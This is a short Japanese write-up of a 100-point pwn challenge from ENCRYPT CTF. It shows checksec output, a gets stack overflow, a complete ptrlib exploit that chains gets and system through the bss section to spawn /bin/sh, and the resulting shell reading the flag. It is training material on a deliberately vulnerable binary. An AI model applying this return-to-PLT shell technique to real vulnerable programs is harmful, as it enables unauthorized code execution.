# [pwn 100pts] pwn2 - ENCRYPT CTF
32bitバイナリでセキュリティ機構は基本的に無効のようです。
```
$ checksec pwn2
[*] 'pwn2'
    Arch:	32 bits (little endian)
    NX:		NX disabled
    SSP:	SSP disabled (No canary found)
    RELRO:	Partial RELRO
    PIE:	PIE disabled
```
IDAで解析しましょう。
またもやgetsによるスタックオーバーフローがあります。

解き方はいろいろあると思いますが、今回はgetsでbssセクションに`/bin/sh`を書き込んだあと、`system("/bin/sh")`を呼び出す方針にします。
もちろんシェルコードを実行するのも良いですし、libcのアドレスをリークするのも良いと思います。

```python
from ptrlib import *

elf = ELF("./pwn2")
sock = Process("./pwn2")

plt_gets = 0x080483d0
plt_system = 0x080483f0

payload = b'A' * 0x2C
payload += p32(plt_gets)
payload += p32(plt_system)
payload += p32(elf.symbol("__bss_start"))
payload += p32(elf.symbol("__bss_start"))

sock.recvuntil("$ ")
sock.sendline(payload)

sock.send("/bin/sh\x00")

sock.interactive()
```

```
$ python solve.py 
[+] Process: Successfully created new process (PID=8330)
bash: command not found: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAÐð4 4 
Bye!
[ptrlib]$ ls
[ptrlib]$ ls
INFO
README.md
flag.txt
pwn2
pwn2.id0
pwn2.id1
pwn2.id2
pwn2.nam
pwn2.til
solve.py
[ptrlib]$ cat flag.txt
encryptCTF{N!c3_j0b_jump3R}
[ptrlib]$
```

# 感想
0CTFのpwnが難しすぎて体力が減っていたので、これくらい簡単なのが来ると心が安らぎます。